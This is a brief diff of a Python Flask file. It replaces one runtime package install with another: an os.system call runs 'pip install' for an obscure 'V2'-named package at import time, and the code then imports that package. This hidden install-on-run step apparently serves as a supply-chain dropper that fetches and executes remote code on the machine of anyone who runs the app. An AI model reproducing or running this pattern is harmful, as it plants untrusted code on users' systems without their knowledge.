@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 import flask
 
 from flask import g
